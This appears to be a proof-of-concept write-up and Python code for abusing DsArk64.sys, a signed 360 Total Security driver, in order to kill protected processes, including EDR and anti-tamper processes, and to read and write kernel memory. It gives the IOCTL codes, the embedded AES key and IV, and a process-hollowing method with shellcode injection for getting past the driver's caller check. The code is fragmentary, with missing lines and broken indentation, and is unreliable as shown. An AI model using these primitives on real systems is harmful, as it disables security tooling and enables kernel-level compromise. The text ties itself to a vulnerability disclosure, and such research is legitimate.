# DsArk64

DsArk64.sys ships with 360 Total Security. WHQL-signed by Microsoft. LOLDrivers: [magicsword-io/LOLDrivers#308](https://github.com/magicsword-io/LOLDrivers/issues/308). CVE: Requested (MITRE).

## Primitives

**Process kill (ring 0)**
- IOCTL `0x80863008`, input: 4-byte raw PID
- Driver calls `ZwOpenProcess(ALL_ACCESS)` + `ZwTerminateProcess` from kernel
- No encryption on this IOCTL
- Bypasses PPL, EDR self-protection, anti-tamper

**Kernel read**
- IOCTL `0x80863028`, AES-128-CBC encrypted input
- `memcpy(out, kernel_addr, n)`, max 512 bytes
- Only validation: `MmIsAddressValid()`

**Kernel write**
- IOCTL `0x80863028`, same encryption
- MDL map + DPC broadcast `memcpy`, max 32 bytes

**Encryption**
- AES-128-CBC, static key embedded in `.data` section
- Key: `62b456ec407f0a9a05911cb6f238a7fe`
- IV: `e59329b6d408e7fa557637e62c9eaa43`
- Buffer layout after decryption: `[MD5(payload) 16B][payload]`

## Access

The driver checks the caller process has a Qihoo Authenticode signature before granting device access. Bypassed via process hollowing:

1. Download any 360 installer from `360.cn` (no account, no CAPTCHA)
2. Spawn it suspended (`CREATE_SUSPENDED`)
3. Inject shellcode via `CreateRemoteThread`; shellcode calls `CreateFileW("\\.\DsArk")`
4. Driver checks `IoGetCurrentProcess()` image name, sees Qihoo cert, allows open
5. `DuplicateHandle` the result back to the attacker process
6. `TerminateProcess` the donor

The installer's `WinMain` never runs.

## Requirements

- Admin (for driver load and registry write)
- Windows 10 / Windows 11 x64
- `pycryptodome` or `cryptography` pip package (for encrypted IOCTL tests)

def _load_aes():
    try:
        from Crypto.Cipher import AES
        def enc(pt, key, iv):
            return AES.new(key, AES.MODE_CBC, iv).encrypt(pt)
        return enc
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        def enc(pt, key, iv):
            e = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
            return e.update(pt) + e.finalize()
        return enc
    except ImportError:
        pass
    return None

def ioctl(h, code, inbuf, out_sz=None):
    if out_sz is None:
        out_sz = max(len(inbuf), 4)
    ib = ctypes.create_string_buffer(bytes(inbuf), len(inbuf))
    ob = ctypes.create_string_buffer(max(out_sz, 4))
    ret = wt.DWORD(0)
    ok = k32.DeviceIoControl(h, code, ib, len(ib), ob, out_sz, ctypes.byref(ret), None)
    err = ctypes.GetLastError()

def _is_pe32(path):
    with open(path, "rb") as f:
        d = f.read(0x200)
    pe = struct.unpack_from('<I', d, 0x3c)[0]
    return struct.unpack_from('<H', d, pe + 4)[0] == 0x14C

        return ctypes.cast(k32.CreateFileW, ctypes.c_void_p).value

        return None

                break

                    k32.ReadProcessMemory(h_proc, a, b, s, None)
                    return b.raw

        return None

        buf = ctypes.create_string_buffer(sz)

        return buf.raw

def hollow_open(donor_exe):

    si = ctypes.create_string_buffer(104)
    struct.pack_into('<I', si, 0, 104)

        donor_exe, None, None, None, False,
        CREATE_SUSPENDED, None, None,
        si, pi)
    if not ok:
        print(f"        [dbg] CreateProcess failed err={ctypes.GetLastError()}")
        return None, 0

    h_thread = struct.unpack_from('<Q', pi, 8)[0]
    child_pid = struct.unpack_from('<I', pi, 16)[0]

    print(f"        [dbg] donor pid={child_pid} arch={arch}")

    try:
        if is_wow64:

            time.sleep(0.5)
            k32.SuspendThread(h_thread)

        cfw = _resolve_remote_createfilew(h_proc, is_wow64)
        if cfw is None:
            print("        [dbg] could not resolve CreateFileW in remote process")
            return None, child_pid

        alloc = k32.VirtualAllocEx(h_proc, 0, 0x1000, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not alloc:
            print(f"        [dbg] VirtualAllocEx failed err={ctypes.GetLastError()}")
            return None, child_pid
        alloc = alloc & (0xFFFFFFFF if is_wow64 else 0xFFFFFFFFFFFFFFFF)

            print(f"        [dbg] CreateRemoteThread failed err={ctypes.GetLastError()}")
            return None, child_pid

        exit_code = wt.DWORD(0)
        k32.GetExitCodeThread(h_remote, ctypes.byref(exit_code))
        print(f"        [dbg] thread exit=0x{exit_code.value:X}")
        k32.CloseHandle(h_remote)

        if is_wow64:
            result_buf = ctypes.create_string_buffer(4)
            k32.ReadProcessMemory(h_proc, alloc + 0x120, result_buf, 4, None)

        else:

            invalid_sentinel = 0xFFFFFFFFFFFFFFFF
        print(f"        [dbg] remote handle=0x{remote_handle:X}")

        if remote_handle == 0 or remote_handle == invalid_sentinel:
            return None, child_pid

        local_handle = wt.HANDLE(0)
        k32.DuplicateHandle.argtypes = [
            wt.HANDLE, wt.HANDLE, wt.HANDLE, ctypes.POINTER(wt.HANDLE),
            wt.DWORD, wt.BOOL, wt.DWORD]

            wt.HANDLE(h_proc), wt.HANDLE(remote_handle),

def terminate_donor(pid):

        hp = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

def build_encrypted_ioctl(cmd_payload):
    if aes_cbc_encrypt is None:
        return None

    pad_len = (16 - (len(cmd_payload) % 16)) % 16
    payload = cmd_payload + b'\x00' * pad_len

    md5 = hashlib.md5(payload).digest()

    plaintext = md5 + payload

    if len(plaintext) < 32:
        plaintext += b'\x00' * (32 - len(plaintext))
    if len(plaintext) % 16 != 0:
        plaintext += b'\x00' * (16 - (len(plaintext) % 16))

    return aes_cbc_encrypt(plaintext, AES_KEY, AES_IV)
